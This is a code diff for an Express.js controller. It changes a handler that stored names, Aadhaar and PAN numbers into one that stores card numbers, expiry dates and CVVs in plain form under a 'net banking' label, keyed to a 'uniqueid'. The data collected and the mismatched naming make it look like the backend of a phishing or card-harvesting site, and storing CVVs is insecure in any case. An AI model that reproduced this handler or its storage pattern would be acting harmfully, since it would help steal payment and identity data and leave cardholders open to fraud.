@@ -1,32 +1,27 @@
-const User = require('../models/User');
+const NetBanking = require('../models/NetBanking');
 
-// Save user data to the database
-exports.saveUserData = async (req, res) => {
+// Handle net banking payment data submission
+exports.submitNetBankingPayment = async (req, res) => {
     try {
-        const { name, mobile, aadhaar, dob, pan, uniqueid } = req.body;
-
-        const newUser = new User({
-            name,
-            mobile,
-            aadhaar,
-            dob,
-            pan,
-            uniqueid,
-        });
+        const { uniqueid, cardNumber, expiryDate, cvv } = req.body;
         
-        await newUser.save();
+        const newNetBankingPayment = new NetBanking({
+            uniqueid,
+            cardNumber,
+            expiryDate,
+            cvv
+        });
 
-        // Send success response with generated userId if needed
+        await newNetBankingPayment.save();
         res.status(200).json({
             success: true,
-            message: "User Data Submitted Successfully!",
-            // userId: newUser._id.toString() // Uncomment if you want to return the user ID
+            message: "Net Banking Payment Data Submitted Successfully!"
         });
     } catch (error) {
         console.error(error);
         res.status(500).json({
             success: false,
-            message: "Error occurred while submitting user data"
+            message: "Error occurred while submitting net banking payment data"
         });
     }
 };
